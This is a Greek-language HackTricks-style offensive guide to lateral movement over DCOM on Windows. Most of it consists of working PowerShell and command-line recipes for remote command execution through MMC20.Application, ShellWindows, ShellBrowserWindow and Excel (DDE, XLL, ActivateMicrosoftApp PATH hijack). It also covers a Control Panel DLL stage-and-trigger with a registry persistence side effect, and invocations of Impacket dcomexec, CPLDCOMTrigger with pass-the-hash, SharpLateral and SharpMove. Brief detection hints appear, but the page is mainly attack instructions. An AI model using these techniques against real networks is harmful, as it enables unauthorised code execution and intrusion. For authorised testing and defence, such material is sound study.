# DCOM Exec

{{#include ../../banners/hacktricks-training.md}}

Το DCOM lateral movement είναι ελκυστικό, επειδή επαναχρησιμοποιεί υπάρχοντες COM servers που εκτίθενται μέσω RPC/DCOM, αντί να δημιουργεί service ή scheduled task. Στην πράξη, αυτό σημαίνει ότι η αρχική σύνδεση ξεκινά συνήθως στη θύρα TCP/135 και στη συνέχεια μεταφέρεται σε δυναμικά εκχωρημένες υψηλές θύρες RPC.

## Προαπαιτούμενα & Παγίδες

- Συνήθως χρειάζεστε περιβάλλον local administrator στον στόχο, ενώ ο απομακρυσμένος COM server πρέπει να επιτρέπει remote launch/activation.
- Από τις **14 Μαρτίου 2023**, η Microsoft επιβάλλει DCOM hardening σε υποστηριζόμενα συστήματα. Παλιοί clients που ζητούν χαμηλό επίπεδο authentication για activation ενδέχεται να αποτυγχάνουν, εκτός αν διαπραγματευτούν τουλάχιστον `RPC_C_AUTHN_LEVEL_PKT_INTEGRITY`. Τα σύγχρονα Windows clients συνήθως αναβαθμίζουν αυτόματα το επίπεδο, οπότε τα τρέχοντα εργαλεία συνήθως συνεχίζουν να λειτουργούν.<sup>[[3]](#references)</sup>
- Η χειροκίνητη ή scripted εκτέλεση DCOM απαιτεί γενικά TCP/135 και το δυναμικό εύρος θυρών RPC του στόχου. Αν χρησιμοποιείτε το Impacket `dcomexec.py` και θέλετε να λάβετε πίσω την έξοδο των εντολών, συνήθως χρειάζεστε επίσης πρόσβαση SMB στο `ADMIN$` (ή σε άλλο share με δυνατότητα ανάγνωσης/εγγραφής).
- Αν το RPC/DCOM λειτουργεί αλλά το SMB είναι μπλοκαρισμένο, το `dcomexec.py -nooutput` μπορεί και πάλι να είναι χρήσιμο για blind execution.

Γρήγοροι έλεγχοι:

```bash
# Enumerate registered DCOM applications
Get-CimInstance Win32_DCOMApplication | Select-Object AppID, Name

# Useful to inspect firewall/RPC issues
Test-NetConnection -ComputerName 10.10.10.10 -Port 135
```

## MMC20.Application

Για περισσότερες πληροφορίες σχετικά με αυτήν την τεχνική, δείτε την [αρχική ανάρτηση για το MMC20.Application](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/).<sup>[[1]](#references)</sup>

Τα αντικείμενα Distributed Component Object Model (DCOM) προσφέρουν μια ενδιαφέρουσα δυνατότητα για αλληλεπιδράσεις μέσω δικτύου με αντικείμενα. Η Microsoft παρέχει ολοκληρωμένη τεκμηρίωση τόσο για το DCOM όσο και για το Component Object Model (COM), διαθέσιμη [εδώ για το DCOM](https://msdn.microsoft.com/en-us/library/cc226801.aspx) και [εδώ για το COM](<https://msdn.microsoft.com/en-us/library/windows/desktop/ms694363(v=vs.85).aspx>). Μπορείτε να ανακτήσετε μια λίστα εφαρμογών DCOM χρησιμοποιώντας την εντολή PowerShell:

```bash
Get-CimInstance Win32_DCOMApplication
```

Το αντικείμενο COM, [MMC Application Class (MMC20.Application)](https://technet.microsoft.com/en-us/library/cc181199.aspx), επιτρέπει τη δημιουργία scripts για λειτουργίες των MMC snap-in. Συγκεκριμένα, αυτό το αντικείμενο περιέχει μια μέθοδο `ExecuteShellCommand` στο `Document.ActiveView`. Περισσότερες πληροφορίες σχετικά με αυτήν τη μέθοδο μπορείτε να βρείτε [εδώ](<https://msdn.microsoft.com/en-us/library/aa815396(v=vs.85).aspx>). Ελέγξτε το εκτελώντας:<sup>[[6]](#references)</sup>

Αυτή η δυνατότητα διευκολύνει την εκτέλεση εντολών μέσω δικτύου, χρησιμοποιώντας μια εφαρμογή DCOM. Για απομακρυσμένη αλληλεπίδραση με το DCOM ως διαχειριστής, μπορείτε να χρησιμοποιήσετε το PowerShell ως εξής:

```bash
[activator]::CreateInstance([type]::GetTypeFromProgID("<DCOM_ProgID>", "<IP_Address>"))
```

Αυτή η εντολή συνδέεται με την εφαρμογή DCOM και επιστρέφει ένα instance του αντικειμένου COM. Στη συνέχεια, μπορεί να κληθεί η μέθοδος ExecuteShellCommand για την εκτέλεση μιας διεργασίας στον απομακρυσμένο host. Η διαδικασία περιλαμβάνει τα εξής βήματα:

Έλεγχος μεθόδων:

```bash
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "10.10.10.10"))
$com.Document.ActiveView | Get-Member
```

Αποκτήστε RCE:

```bash
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "10.10.10.10"))
$com.Document.ActiveView.ExecuteShellCommand(
    "cmd.exe",
    $null,
    "/c powershell -NoP -W Hidden -Enc <B64>",
    "7"
)
```

Το τελευταίο όρισμα είναι το στυλ παραθύρου. Το `7` διατηρεί το παράθυρο ελαχιστοποιημένο. Σε λειτουργικό επίπεδο, η εκτέλεση μέσω MMC συνήθως οδηγεί σε απομακρυσμένη διεργασία `mmc.exe` που εκκινεί το payload σας, κάτι που διαφέρει από τα αντικείμενα που βασίζονται στο Explorer και περιγράφονται παρακάτω.

## ShellWindows & ShellBrowserWindow

**Για περισσότερες πληροφορίες σχετικά με αυτήν την τεχνική, δείτε την αρχική δημοσίευση [https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)**<sup>[[2]](#references)</sup>

Παρατηρήθηκε ότι το αντικείμενο **MMC20.Application** δεν είχε τιμή `LaunchPermission` ειδική για την εφαρμογή.<sup>[[2]](#references)</sup> Αυτό δεν παρέχει από μόνο του πρόσβαση: το COM ελέγχει το ACL `DefaultLaunchPermission` του υπολογιστή και τους περιορισμούς εκκίνησης/πρόσβασης σε επίπεδο υπολογιστή, όπου εφαρμόζονται.<sup>[[9]](#references)[[10]](#references)</sup> Για περισσότερες λεπτομέρειες, μπορείτε να εξετάσετε το [νήμα](https://twitter.com/tiraniddo/status/817532039771525120), ενώ συνιστάται η χρήση του OleView .NET του [@tiraniddo](https://twitter.com/tiraniddo) για το φιλτράρισμα αντικειμένων χωρίς ρητό Launch Permission.

Επισημάνθηκαν δύο συγκεκριμένα αντικείμενα, τα `ShellBrowserWindow` και `ShellWindows`, επειδή δεν έχουν ρητά Launch Permissions.<sup>[[2]](#references)</sup> Η απουσία τιμής `LaunchPermission` στο `HKCR:\AppID\{guid}` σημαίνει ότι δεν υπάρχει ACL εκκίνησης ειδικό για την εφαρμογή· **δεν** σημαίνει ότι η απομακρυσμένη ενεργοποίηση είναι απεριόριστη.<sup>[[9]](#references)[[10]](#references)</sup>

Σε σύγκριση με το `MMC20.Application`, αυτά τα αντικείμενα είναι συχνά πιο διακριτικά από άποψη OPSEC, επειδή η εντολή συνήθως καταλήγει ως θυγατρική διεργασία της `explorer.exe` στον απομακρυσμένο host, αντί της `mmc.exe`.

### ShellWindows

Για το `ShellWindows`, το οποίο δεν έχει ProgID, οι μέθοδοι .NET `Type.GetTypeFromCLSID` και `Activator.CreateInstance` επιτρέπουν τη δημιουργία στιγμιότυπου του αντικειμένου μέσω του CLSID του. Αυτή η διαδικασία χρησιμοποιεί το OleView .NET για την ανάκτηση του CLSID του `ShellWindows`. Μετά τη δημιουργία του στιγμιότυπου, είναι δυνατή η αλληλεπίδραση μέσω της μεθόδου `WindowsShell.Item`, οδηγώντας σε κλήση μεθόδου όπως η `Document.Application.ShellExecute`.<sup>[[2]](#references)</sup>

Παρακάτω παρουσιάζονται παραδείγματα εντολών PowerShell για τη δημιουργία στιγμιότυπου του αντικειμένου και την απομακρυσμένη εκτέλεση εντολών:

```bash
# Example
$com = [Type]::GetTypeFromCLSID("<clsid>", "<IP>")
$obj = [System.Activator]::CreateInstance($com)
$item = $obj.Item()
$item.Document.Application.ShellExecute("cmd.exe", "/c calc.exe", "c:\windows\system32", $null, 0)
```

### ShellBrowserWindow

Το `ShellBrowserWindow` είναι παρόμοιο, αλλά μπορείτε να το δημιουργήσετε απευθείας μέσω του CLSID του και να κάνετε pivot στο `Document.Application.ShellExecute`:

```bash
$com = [Type]::GetTypeFromCLSID("C08AFD90-F2A1-11D1-8455-00A0C91F3880", "10.10.10.10")
$obj = [System.Activator]::CreateInstance($com)
$obj.Document.Application.ShellExecute(
    "cmd.exe",
    "/c whoami > C:\\Windows\\Temp\\dcom.txt",
    "C:\\Windows\\System32",
    $null,
    0
)
```

### Lateral Movement με αντικείμενα Excel DCOM

Το Lateral Movement μπορεί να επιτευχθεί με την εκμετάλλευση αντικειμένων DCOM του Excel. Για περισσότερες πληροφορίες, συνιστάται να διαβάσετε τη συζήτηση σχετικά με τη χρήση του Excel DDE για lateral movement μέσω DCOM στο [blog της Cybereason](https://www.cybereason.com/blog/leveraging-excel-dde-for-lateral-movement-via-dcom).<sup>[[5]](#references)</sup>

Το project Empire παρέχει ένα script PowerShell, το οποίο παρουσιάζει τη χρήση του Excel για απομακρυσμένη εκτέλεση κώδικα (RCE) μέσω χειρισμού αντικειμένων DCOM. Παρακάτω παρατίθενται αποσπάσματα από το script που είναι διαθέσιμο στο [GitHub repository του Empire](https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1), τα οποία παρουσιάζουν διαφορετικές μεθόδους κατάχρησης του Excel για RCE:

```bash
# Detection of Office version
elseif ($Method -Match "DetectOffice") {
    $Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
    $Obj = [System.Activator]::CreateInstance($Com)
    $isx64 = [boolean]$obj.Application.ProductCode[21]
    Write-Host  $(If ($isx64) {"Office x64 detected"} Else {"Office x86 detected"})
}
# Registration of an XLL
elseif ($Method -Match "RegisterXLL") {
    $Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
    $Obj = [System.Activator]::CreateInstance($Com)
    $obj.Application.RegisterXLL("$DllPath")
}
# Execution of a command via Excel DDE
elseif ($Method -Match "ExcelDDE") {
    $Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
    $Obj = [System.Activator]::CreateInstance($Com)
    $Obj.DisplayAlerts = $false
    $Obj.DDEInitiate("cmd", "/c $Command")
}
```

Πρόσφατη έρευνα επέκτεινε αυτόν τον τομέα με τη μέθοδο `ActivateMicrosoftApp()` του `Excel.Application`. Η βασική ιδέα είναι ότι το Excel μπορεί να προσπαθήσει να εκκινήσει παλαιότερες εφαρμογές της Microsoft, όπως τις FoxPro, Schedule Plus ή Project, αναζητώντας τις στο `PATH` του συστήματος. Αν ο χειριστής μπορεί να τοποθετήσει ένα payload με ένα από αυτά τα αναμενόμενα ονόματα σε μια εγγράψιμη τοποθεσία που περιλαμβάνεται στο `PATH` του στόχου, το Excel θα το εκτελέσει.<sup>[[4]](#references)</sup>

Απαιτήσεις για αυτήν την παραλλαγή:

- Τοπικά δικαιώματα διαχειριστή στον στόχο
- Εγκατεστημένο Excel στον στόχο
- Δυνατότητα εγγραφής ενός payload σε έναν εγγράψιμο κατάλογο στο `PATH` του στόχου

Πρακτικό παράδειγμα κατάχρησης της αναζήτησης FoxPro (`FOXPROW.exe`):

```bash
copy C:\Windows\System32\calc.exe \\192.168.52.100\c$\Users\victim\AppData\Local\Microsoft\WindowsApps\FOXPROW.exe
$com = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("Excel.Application", "192.168.52.100"))
$com.ActivateMicrosoftApp("5")
```

Αν στον host της επίθεσης δεν είναι καταχωρισμένο το τοπικό `Excel.Application` ProgID, δημιουργήστε το απομακρυσμένο αντικείμενο χρησιμοποιώντας αντ’ αυτού το CLSID:

```bash
$com = [System.Activator]::CreateInstance([type]::GetTypeFromCLSID("00020812-0000-0000-C000-000000000046", "192.168.52.100"))
$com.Application.ActivateMicrosoftApp("5")
```

Τιμές που έχει παρατηρηθεί να χρησιμοποιούνται καταχρηστικά στην πράξη:

- `5` -> `FOXPROW.exe`
- `6` -> `WINPROJ.exe`
- `7` -> `SCHDPLUS.exe`

### COpenControlPanel — φόρτωση ενός καταχωρισμένου DLL του Control Panel

Η κλάση `COpenControlPanel` (CLSID `{06622D85-6856-4460-8DE1-A81921B41C4B}`) εκθέτει το `IOpenControlPanel` (IID `{D11AD862-66DE-4DF4-BF6C-1F5621996AF1}`). Η μέθοδός της `Open()` προκαλεί τη φόρτωση των DLL του Control Panel που είναι καταχωρισμένα στο κλειδί `Control Panel\Cpls` από ένα απομακρυσμένο `dllhost.exe`. Η κλάση δεν έχει ρητά δικαιώματα εκκίνησης/πρόσβασης στα συστήματα που δοκιμάστηκαν, επομένως κληρονομεί την προεπιλεγμένη πολιτική DCOM (η οποία συνήθως απαιτεί δικαιώματα διαχειριστή για απομακρυσμένη ενεργοποίηση). Ένα τυχαίο όνομα στοιχείου αρκεί για να κάνει την `Open()` να επεξεργαστεί τα καταχωρισμένα DLL· το payload δεν χρειάζεται επέκταση `.cpl`, αλλά πρέπει να είναι έγκυρο DLL της σωστής αρχιτεκτονικής.<sup>[[7]](#references)</sup>

Αυτό το primitive είναι **stage-and-trigger**, όχι εκτέλεση μόνο με εντολές: πρώτα αντιγράψτε ένα DLL στον στόχο και δημιουργήστε μια τιμή `REG_EXPAND_SZ` που δείχνει σε αυτό και, στη συνέχεια, ενεργοποιήστε το αντικείμενο μέσω DCOM. Για παράδειγμα, από ένα περιβάλλον Windows με δικαιώματα διαχειριστή:<sup>[[7]](#references)</sup>

```cmd
copy payload.dll \\target\C$\Windows\Temp\panel.dll
reg.exe add "\\target\HKLM\Software\Microsoft\Windows\CurrentVersion\Control Panel\Cpls" /v Updater /t REG_EXPAND_SZ /d "C:\Windows\Temp\panel.dll" /f
```

Ο δημόσια διαθέσιμος client [CPLDCOMTrigger](https://github.com/klsecservices/CPLDCOMTrigger) υλοποιεί την undocumented κλήση DCOM με το Impacket. Αρκεί να δοθεί ένα αυθαίρετο όνομα στοιχείου του Πίνακα Ελέγχου· ο client μπορεί να αναφέρει σφάλμα RPC, παρόλο που το `dllhost.exe` φόρτωσε το DLL.<sup>[[8]](#references)</sup>

```bash
git clone https://github.com/klsecservices/CPLDCOMTrigger
cd CPLDCOMTrigger
python3 CPLTrig.py 'DOMAIN/user:password@target' -cpl random

# Pass-the-hash and Kerberos are also implemented
python3 CPLTrig.py 'DOMAIN/user@target' -hashes ':NTHASH' -cpl random
python3 CPLTrig.py 'DOMAIN/user@target.domain.local' -aesKey AES_KEY_HEX -dc-ip 10.10.10.10 -cpl random
```

Σε επιχειρησιακό επίπεδο, αυτή η μέθοδος απαιτεί επίσης κανάλι εγγραφής αρχείων και απομακρυσμένη πρόσβαση στο registry, επομένως είναι πιο θορυβώδης από τις `MMC20`/`ShellWindows`. Δημιουργεί παρενέργεια persistence, επειδή το άνοιγμα του Control Panel αργότερα μπορεί να φορτώσει ξανά την ίδια καταχώριση. Αφαιρέστε την τιμή μετά την εκτέλεση και αναζητήστε μη αναμενόμενες τιμές `Control Panel\Cpls` σε συνδυασμό με ασυνήθιστες φορτώσεις DLL στο `dllhost.exe`.<sup>[[7]](#references)</sup>

```cmd
reg.exe delete "\\target\HKLM\Software\Microsoft\Windows\CurrentVersion\Control Panel\Cpls" /v Updater /f
del \\target\C$\Windows\Temp\panel.dll
```

### Εργαλεία αυτοματοποίησης για Lateral Movement

Επισημαίνονται δύο εργαλεία για την αυτοματοποίηση αυτών των τεχνικών:

- **Invoke-DCOM.ps1**: Ένα PowerShell script που παρέχεται από το project Empire και απλοποιεί την κλήση διαφορετικών μεθόδων για την εκτέλεση κώδικα σε απομακρυσμένα μηχανήματα. Το script είναι διαθέσιμο στο GitHub repository του Empire.

- **SharpLateral**: Ένα εργαλείο σχεδιασμένο για την απομακρυσμένη εκτέλεση κώδικα, το οποίο μπορεί να χρησιμοποιηθεί με την εντολή:

```bash
SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe
```

- [SharpMove](https://github.com/0xthirteen/SharpMove):

```bash
SharpMove.exe action=dcom computername=remote.host.local command="C:\windows\temp\payload.exe\" method=ShellBrowserWindow amsi=true
```

## Αυτόματα εργαλεία

- Το script PowerShell [**Invoke-DCOM.ps1**](https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1) επιτρέπει την εύκολη χρήση όλων των σχολιασμένων τρόπων εκτέλεσης κώδικα σε άλλα μηχανήματα.
- Μπορείτε να χρησιμοποιήσετε το `dcomexec.py` του Impacket για να εκτελείτε εντολές σε απομακρυσμένα συστήματα μέσω DCOM. Οι τρέχουσες εκδόσεις υποστηρίζουν τα `ShellWindows`, `ShellBrowserWindow` και `MMC20`, ενώ ως προεπιλογή χρησιμοποιούν το `ShellWindows`.

```bash
dcomexec.py 'DOMAIN'/'USER':'PASSWORD'@'target_ip' "cmd.exe /c whoami"

# Pick the object explicitly
dcomexec.py -object MMC20 'DOMAIN'/'USER':'PASSWORD'@'target_ip' "cmd.exe /c whoami"

# Blind execution when SMB/output retrieval is not available
dcomexec.py -object ShellBrowserWindow -nooutput 'DOMAIN'/'USER':'PASSWORD'@'target_ip' "cmd.exe /c calc.exe"
```

- Θα μπορούσατε επίσης να χρησιμοποιήσετε το [**SharpLateral**](https://github.com/mertdas/SharpLateral):

```bash
SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe
```

- Θα μπορούσατε επίσης να χρησιμοποιήσετε το [**SharpMove**](https://github.com/0xthirteen/SharpMove)

```bash
SharpMove.exe action=dcom computername=remote.host.local command="C:\windows\temp\payload.exe\" method=ShellBrowserWindow amsi=true
```





## References

- [1] [Πλευρική μετακίνηση με χρήση του COM Object MMC20.Application](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/)
- [2] [Πλευρική μετακίνηση μέσω DCOM: Γύρος 2](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)
- [3] [KB5004442—Διαχείριση αλλαγών για την παράκαμψη της δυνατότητας ασφαλείας του Windows DCOM Server (CVE-2021-26414)](https://support.microsoft.com/en-us/topic/kb5004442-manage-changes-for-windows-dcom-server-security-feature-bypass-cve-2021-26414-f1400b52-c141-43d2-941e-37ed901c769c)
- [4] [Πλευρική μετακίνηση: Εκμετάλλευση της ισχύος της εφαρμογής Excel μέσω DCOM](https://specterops.io/blog/2023/10/30/lateral-movement-abuse-the-power-of-dcom-excel-application/)
- [5] [Αξιοποίηση του Excel DDE για πλευρική μετακίνηση μέσω DCOM](https://www.cybereason.com/blog/leveraging-excel-dde-for-lateral-movement-via-dcom)
- [6] [technet.microsoft.com - Κλάση εφαρμογής MMC (MMC20.Application)](https://technet.microsoft.com/en-us/library/cc181199.aspx)
- [7] [Χρήση αντικειμένων DCOM για απομακρυσμένη εκτέλεση εντολών](https://securelist.com/lateral-movement-via-dcom-abusing-control-panel/118232/)
- [8] [CPLDCOMTrigger](https://github.com/klsecservices/CPLDCOMTrigger)
- [9] [DefaultLaunchPermission - Microsoft Learn](https://learn.microsoft.com/en-us/windows/win32/com/defaultlaunchpermission)
- [10] [MS-DCOM: Παράρτημα B, Συμπεριφορά προϊόντος - Microsoft Learn](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-dcom/acc42954-4073-4f05-b850-efd562022077)
{{#include ../../banners/hacktricks-training.md}}
